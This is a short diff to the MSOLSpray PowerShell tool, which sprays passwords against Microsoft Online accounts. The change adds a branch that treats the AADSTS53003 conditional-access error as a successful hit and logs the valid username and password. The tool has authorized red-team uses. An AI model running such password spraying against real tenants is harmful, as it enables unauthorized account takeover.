@@ -141,6 +141,13 @@ function Invoke-MSOLSpray{
                 $fullresults += "$username : $password"
                 }
 
+                #Conditional Access response (access policy blocks token issuance).
+            ElseIf($RespErr -match "AADSTS53003")
+                {
+                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates a conditional access policy is in place and the policy blocks token issuance."
+                $fullresults += "$username : $password"
+                }
+
                 # Locked out account or Smart Lockout in place
             ElseIf($RespErr -match "AADSTS50053")
                 {
